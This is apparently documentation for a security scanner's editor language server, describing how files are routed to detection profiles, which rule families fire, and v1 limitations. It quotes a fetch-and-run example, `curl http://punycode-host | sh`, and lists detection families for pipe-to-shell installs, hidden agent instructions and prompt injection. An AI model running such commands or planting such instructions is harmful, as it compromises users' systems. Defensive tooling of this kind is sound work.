# LSP analysis profiles (M14)

`tirith lsp` runs a **Language Server** over stdin/stdout so an editor extension
can surface tirith diagnostics inline as you edit. The server analyzes only the
editor's in-memory document text and never re-reads the document from disk. It
does read your tirith policy from disk (the Log file profile reads it offline,
for custom injection seeds only). Two opt-in settings let it contact the
network: a configured remote policy server, which policy resolution for the
other three profiles can fetch from, and a canary created with
`--callback-url`, whose callback is sent when a buffer contains that token.

When a document is opened or changed, the server:

1. Derives the file path from the document URI and routes it to an **analysis
   profile** by file type (`profile_for_path`). An unrecognised file type gets
   **zero diagnostics** (the server clears any it had previously published).
   A buffer over 10 MiB is not analyzed, whatever its file type; see
   [Limitations](#limitations-v1).
2. Runs the engine over the buffer once per **scan context** the profile names
   (`contexts_for`), **unions** the findings, and applies the profile's
   **retain** allow-set (`retains`) — keeping only the diagnostics that make
   sense for that file type. The **Log file** profile is the one exception: a
   `.log` buffer is captured command output, so it is analyzed through the M7
   **output firewall** (`engine::analyze_output`) instead — selected by
   `uses_output_analysis` — and the same `retains` allow-set is applied to the
   resulting findings.
3. Maps each retained finding to one LSP diagnostic (severity, message, the
   rule-id as `code`, source `tirith`, and a range — see below).

`tirith lsp` adds **no new detection rules**. Every finding it reports comes
from a rule that already ships and is reachable today via the named context (or,
for the Log file profile, via the `analyze_output` output firewall). The only
other diagnostics are the "NOT scanned" notices under
[Limitations](#limitations-v1), which carry no rule `code`.

## Profiles

| profile               | which files                                                                 | scan context(s)        | rule families surfaced                                       |
| --------------------- | --------------------------------------------------------------------------- | ---------------------- | ------------------------------------------------------------ |
| **AI-config**         | `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, anything under `.claude/` / `.cursor/`, MCP server configs | `FileScan` **and** `Paste` | See [AI-config rule families](#ai-config-rule-families)       |
| **Markdown install doc** | `README.md`, `INSTALL.md`, `INSTALLATION.md`, `getting-started.md`, and friends (a curated set — **not** every `.md`) | `Paste`                | See [Markdown install doc rule families](#markdown-install-doc-rule-families) |
| **Source code**       | a curated source-extension set (`.rs`, `.py`, `.ts`, `.go`, `.sh`, …)        | `Paste`                | See [Source code rule families](#source-code-rule-families)  |
| **Log file**          | the `.log` extension                                                         | `analyze_output` (output firewall) | See [Log file rule families](#log-file-rule-families)        |

### AI-config rule families

- hidden agent instructions
- invisible/non-ASCII config smuggling
- prompt-injection indicators
- the terminal byte-scan deception family
- **and** suspicious install URLs (homograph / punycode / plain-HTTP / `curl | sh`) embedded in the file

### Markdown install doc rule families

- pipe-to-shell install lines
- plain-HTTP / insecure-TLS / shortened URLs
- homograph / punycode / raw-IP / look-alike-TLD hostnames

### Source code rule families

- trojan-source homoglyphs (confusable / bidi / zero-width / Unicode-tags / variation-selector / invisible-whitespace / Hangul-filler)
- hard-coded credentials

### Log file rule families

A `.log` buffer is captured command output, so it is analyzed through the M7
**output firewall** (`engine::analyze_output`) — where the output-direction
rules fire (they fire **only** there, never on the `engine::analyze` path the
other profiles use):

- OSC 52 clipboard writes (`output_osc52_clipboard_write`)
- hidden text in terminal output (`output_hidden_text`)
- fake shell prompts (`output_fake_prompt`)
- OSC 8 hyperlink mismatch (`output_terminal_hyperlink_mismatch`)
- terminal-title manipulation (`output_title_manipulation`)
- mid-stream screen clears (`output_clear_screen`)
- truncated escape sequences at end-of-buffer (`output_truncated_escape_sequence`)

### Routing precedence

Routing is by filename first, then extension. AI-config wins over everything, so
a `CLAUDE.md` is **AI-config**, not a Markdown install doc, and a file under
`.cursor/rules/` is AI-config regardless of its extension. After AI-config come
the curated install-doc filenames, then the source extensions, then `.log`. Any
other file routes nowhere and gets no diagnostics — the safe default.

## Why AI-config analyzes in two contexts

A `CLAUDE.md` is two threats at once, and the two live in **different branches**
of the engine:

- The **hidden-instruction / invisible-content** signals (`agent_instruction_hidden`,
  the `config_*` family, the byte-scan deception rules) fire **only** in the
  `FileScan` branch — `Exec` / `Paste` never invoke the file-content scanners.
- A **suspicious install URL** in the file's body (e.g. a
  `curl http://punycode-host | sh` line an agent might fetch) fires the
  URL / transport / hostname rules, which run **only** in the `Exec` / `Paste`
  branch — `FileScan` surfaces nothing for them.

Verified empirically: a plain suspicious URL in a `CLAUDE.md` body produces zero
findings under `FileScan` alone, and a hidden-HTML-comment directive produces
zero findings under `Paste` alone. So the AI-config profile is the one profile
that analyzes in **both** contexts and unions the result. `Paste` (not `Exec`)
is used for the URL half because a config file is pasted-like prose, not a typed
command: `Paste` runs the URL + command-shape rules cleanly without `Exec`'s
command-card prelude stripping and taint / blast-radius hot-path guards, and its
tier-1 regex is a superset of `Exec`'s so nothing is gated out. The retain
allow-set then drops the incidental `Paste`-only noise (a bare prose-line
`pipe_to_interpreter`, `hidden_multiline`) and keeps the genuine AI-config
signals plus the suspicious-URL families.

## Diagnostic ranges: precise vs whole-document

LSP diagnostics carry a range (a start/end line:column). tirith findings do not
all carry a position — most are whole-document facts (a URL was extracted, a
command shape matched). So in v1:

- A finding whose **evidence carries a byte offset** into the buffer gets a
  **precise range** at that position. Two evidence kinds carry byte offsets:
  `ByteSequence` (the bidi / zero-width / invisible-unicode byte-scan rules) and
  the first suspicious char of `HomoglyphAnalysis` (confusable detection). The
  byte offset is converted to an LSP `Position` whose `character` is a **UTF-16
  code-unit** column (per the LSP spec — not a byte index and not a scalar-value
  index), and a one-unit span is highlighted so the squiggle is visible. This
  precise path covers the text/source confusable and byte-scan findings
  (`ByteSequence` / `HomoglyphAnalysis` with offsets, e.g. `ConfusableText`); the
  suspicious-URL and hostname-confusable findings (`ConfusableDomain`,
  `MixedScriptInLabel`, punycode) emit `Evidence::Url` / `HostComparison`, which
  carry no offset, so those are whole-document in v1.
- **Every other finding is whole-document**: its range spans from the start of
  the buffer to its end. This is correct (the finding really is about the whole
  document) but coarse; a future revision can thread richer spans through the
  engine to tighten these.

Severities map as: Critical / High → `Error`, Medium → `Warning`, Low →
`Information`, Info → `Hint`. The `code` field is the rule-id string (e.g.
`punycode_domain`) so an editor can group or filter by rule, and `source` is
`tirith`.

## Limitations (v1)

| limitation                          | detail                                                                                                                                                                                                 |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **AI-config drift is out of scope**  | The drift rules `ai_config_hidden_instruction_added` / `ai_config_tool_use_escalation` compare a file against a last-known-safe **snapshot** (`tirith ai diff`). They cannot fire on a single in-editor buffer with no snapshot to diff against, so the LSP never produces them (they remain in the AI-config retain set only so a future snapshot-aware client keeps them if present). |
| **Whole-document ranges**            | As above — findings without byte-offset evidence are reported against the whole document rather than a precise span.                                                                                    |
| **No quick-fixes / code actions**    | v1 publishes diagnostics only. It does not offer code actions, hovers, or completions.                                                                                                                  |
| **10 MiB analysis cap**              | A buffer over 10 MiB (the file scanner's `MAX_FILE_SIZE`) is not scanned. The server publishes one Information-level "NOT scanned" notice at the first character instead of an empty result, so the file does not look clean. An internal analysis error publishes the same kind of notice at Warning level. |

> **Note:** Log-file diagnostics are **no longer** a v1 limitation. A `.log`
> buffer is captured command output, so the server now analyzes it through the
> M7 output firewall (`engine::analyze_output`) — the semantically-correct
> analyzer for an output stream — where the `output_*` direction rules fire. See
> [Log file rule families](#log-file-rule-families).

## Running it

`tirith lsp` speaks the LSP wire protocol on stdio; run it from an editor's LSP
client, not interactively. The server advertises full-text document sync and the
`didOpen` / `didChange` / `didClose` notifications, so each change re-analyzes
the complete new buffer.
